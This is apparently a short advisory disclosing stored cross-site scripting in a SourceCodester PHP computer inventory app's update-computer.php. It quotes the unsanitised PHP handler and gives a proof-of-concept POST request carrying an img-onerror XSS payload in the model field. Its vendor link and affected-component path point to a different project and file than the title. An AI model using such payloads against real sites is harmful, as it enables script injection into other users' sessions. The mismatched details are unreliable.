# SOURCECODESTER / Computer Inventory System - update-computer.php STORED XSS

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17109/barangay-population-monitoring-system-using-php-mysql-and-chartjs-source-code.html

## Affected Component
> /endpoint/update-resident.php

## Code
```php
if (isset($_POST['model'], $_POST['serial_number'], $_POST['date_purchased'], $_POST['warranty_expiration'], $_POST['operating_system'], $_POST['ram'], $_POST['rom'])) {
        $computerID = $_POST['tbl_computer_id'];
        $model = $_POST['model'];
        $sn = $_POST['serial_number'];
        $datePurchased = $_POST['date_purchased'];
        $warrantyExpiration = $_POST['warranty_expiration'];
        $operatingSystem = $_POST['operating_system'];
        $ram = $_POST['ram'];
        $rom = $_POST['rom'];

        try {
            $stmt = $conn->prepare("UPDATE tbl_computer SET model = :model, serial_number = :serial_number, date_purchased = :date_purchased, warranty_expiration = :warranty_expiration, operating_system = :operating_system, ram = :ram, rom = :rom WHERE tbl_computer_id = :tbl_computer_id");

```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /endpoint/update-computer.php HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

tbl_computer_id=7&model=%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27NoChizPlz%27%29%3E&serial_number=696969&date_purchased=2024-02-01&warranty_expiration=2024-02-28&operating_system=Windows&ram=8&rom=8
```

## Screenshot


